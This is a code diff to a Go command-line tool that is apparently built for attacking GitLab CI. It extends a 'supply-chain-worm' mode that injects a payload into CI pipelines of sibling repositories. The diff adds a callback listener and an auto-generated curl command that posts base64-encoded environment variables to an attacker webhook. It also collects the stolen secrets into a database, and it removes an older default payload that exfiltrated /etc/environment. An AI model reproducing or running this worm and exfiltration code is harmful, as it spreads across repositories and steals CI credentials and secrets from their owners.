@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"io"
 	"maps"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -1408,7 +1409,11 @@ var attackCmd = &cobra.Command{
 					if i > 0 {
 						fmt.Fprintln(cmd.OutOrStdout())
 					}
-					renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Callback %d — from %s (%d secrets)", i+1, r.Addr, len(r.Secrets)))
+					source := r.Addr
+					if r.Project != "" {
+						source = r.Project + " (" + r.Addr + ")"
+					}
+					renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Callback %d — from %s (%d secrets)", i+1, source, len(r.Secrets)))
 					renderExfilSecrets(cmd.OutOrStdout(), r.Secrets, atkAllVars)
 				}
 				// Save to DB
@@ -1492,10 +1497,6 @@ var attackCmd = &cobra.Command{
 
 		// supply-chain-worm mode: self-propagating CI injection across sibling repos
 		if atkSupplyChainWorm {
-			wormPayload := strings.TrimSpace(atkWormPayload)
-			if wormPayload == "" {
-				wormPayload = "curl -sS -H 'PRIVATE-TOKEN: $CI_JOB_TOKEN' 'https://example.com/exfil?data=$(base64 /etc/environment)'"
-			}
 			maxRepos := atkWormMaxRepos
 			if maxRepos <= 0 {
 				maxRepos = 5
@@ -1515,8 +1516,41 @@ var attackCmd = &cobra.Command{
 			if groupPath == "" {
 				return fmt.Errorf("--worm-target-group is required when the target project has no group namespace")
 			}
+
+			// When --webhook is set, start a listener and inject callback exfil into the worm payload
+			webhookURL := strings.TrimSpace(atkWebhook)
+			var listener *Listener
+			if webhookURL != "" {
+				// Extract port from webhook URL for the listener
+				listenAddr := ":9445"
+				if u, uerr := url.Parse(webhookURL); uerr == nil && u.Port() != "" {
+					listenAddr = ":" + u.Port()
+				}
+				listener = NewListener(listenAddr, cmd.ErrOrStderr())
+				listenErrCh := make(chan error, 1)
+				go func() { listenErrCh <- listener.Run(ctx) }()
+				select {
+				case <-listener.Ready():
+				case err := <-listenErrCh:
+					return fmt.Errorf("worm listener failed to start: %w", err)
+				case <-time.After(5 * time.Second):
+					return fmt.Errorf("worm listener startup timeout")
+				}
+				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Worm listener active on %s", listener.Addr()))
+			}
+
+			wormPayload := strings.TrimSpace(atkWormPayload)
+			if wormPayload == "" && webhookURL != "" {
+				// Auto-generate callback exfil payload
+				wormPayload = fmt.Sprintf(
+					`curl -sS -X POST -H "Content-Type: application/json" -d "{\"project\":\"$CI_PROJECT_PATH\",\"data\":\"$(printenv | base64 -w0)\"}" "%s/exfil" || true`,
+					webhookURL)
+			} else if wormPayload == "" {
+				wormPayload = "printenv | sort"
+			}
+
 			result := payloadgen.RunSupplyChainWorm(ctx, client.GL, p.ID, groupPath, wormPayload, maxRepos, atkBranch, atkAuthorName, atkAuthorEmail, cmd.ErrOrStderr())
-			if outputJSON {
+			if outputJSON && listener == nil {
 				b, _ := json.MarshalIndent(result, "", "  ")
 				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
 				return err
@@ -1524,6 +1558,47 @@ var attackCmd = &cobra.Command{
 			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Supply chain worm propagated to %d repos", result.Promoted))
 			if result.Failed > 0 {
 				renderWarning(cmd.OutOrStdout(), fmt.Sprintf("%d repos failed to inject", result.Failed))
+			}
+
+			// Wait for callbacks from infected repos
+			if listener != nil && result.Promoted > 0 {
+				listenTimeout := 3 * time.Minute
+				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Waiting for %d callback(s) (timeout: %s)...", result.Promoted, listenTimeout))
+				results, werr := listener.WaitFor(ctx, listenTimeout)
+				_ = listener.Stop(ctx)
+				if werr != nil {
+					renderWarning(cmd.OutOrStdout(), fmt.Sprintf("listener: %v", werr))
+				}
+				if len(results) > 0 {
+					renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Received %d callback(s) from infected repos", len(results)))
+					for i, r := range results {
+						if i > 0 {
+							fmt.Fprintln(cmd.OutOrStdout())
+						}
+						source := r.Addr
+						if r.Project != "" {
+							source = r.Project
+						}
+						renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Callback %d — %s (%d secrets)", i+1, source, len(r.Secrets)))
+						renderExfilSecrets(cmd.OutOrStdout(), r.Secrets, atkAllVars)
+					}
+					// Persist to DB
+					allSecrets := make(map[string]string)
+					for _, r := range results {
+						prefix := ""
+						if r.Project != "" {
+							prefix = r.Project + "/"
+						}
+						for k, v := range r.Secrets {
+							allSecrets[prefix+k] = v
+						}
+					}
+					persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, "", atkBranch, "", 0, 0, allSecrets)
+				} else {
+					renderWarning(cmd.OutOrStdout(), "No callbacks received — pipelines may still be queued")
+				}
+			} else if listener != nil {
+				_ = listener.Stop(ctx)
 			}
 			return nil
 		}
